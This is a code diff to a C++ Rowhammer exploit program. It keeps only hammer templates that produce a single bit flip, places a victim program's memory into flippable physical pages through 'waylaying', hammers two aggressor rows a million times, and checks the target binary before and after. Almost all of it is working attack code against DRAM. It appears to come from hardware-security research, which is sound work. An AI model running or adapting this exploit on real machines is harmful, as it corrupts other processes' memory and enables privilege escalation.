@@ -128,8 +128,20 @@ int main(int argc, char **argv)
         for (HammerResult h : result_pool[target.offset & 0xfff])
             if (addrmap.has_pa(h.p) && addrmap.has_pa(h.q) && addrmap.has_pa(h.base))
             {
-                cout << green << "- Available template: "; h.print();
-                hrs.push_back(h);
+                vector<HammerResult> flips = find_flips(h.p, h.q);
+                /*for (HammerResult hr : flips)
+                {
+                    cout << "\t"; hr.print();
+                }*/
+                if (flips.size() == 1)
+                {
+                    cout << green << "- Flips: " << dec << flips.size() << ", Template: "; h.print(); cout << restore;
+                    hrs.push_back(h);
+                }
+                else
+                {
+                    cout << yellow << "- Flips: " << dec << flips.size() << ", Template: "; h.print(); cout << restore;
+                }
             }
             else
             {
@@ -158,16 +170,17 @@ int main(int argc, char **argv)
         addrmap.add(hold_pages);
         addrmap.add_pagemap(hold_pages);
         // 4. waylaying
+        //exit(0);
         cout << blue << "* Wait 5s to start waylaying..." << restore << endl;
         usleep(5000000);
         waylaying_step();
         // 5. attack
         cout << green << "- Check original program..." << restore << endl;
         system("./target");
-        cout << blue << "* Hammering 3000000 times on 0x" << hex << addrmap.page_map[victim_hr.p].p << " and 0x" << addrmap.page_map[victim_hr.q].p << endl;
-        hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
-        hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
-        hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
+        cout << blue << "* Hammering 1000000 times on 0x" << hex << addrmap.page_map[victim_hr.p].p << " and 0x" << addrmap.page_map[victim_hr.q].p << endl;
+        hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 1000000, 0);
+        //hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
+        //hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
         cout << green << "- Check result" << endl;
         system("./target");
     }
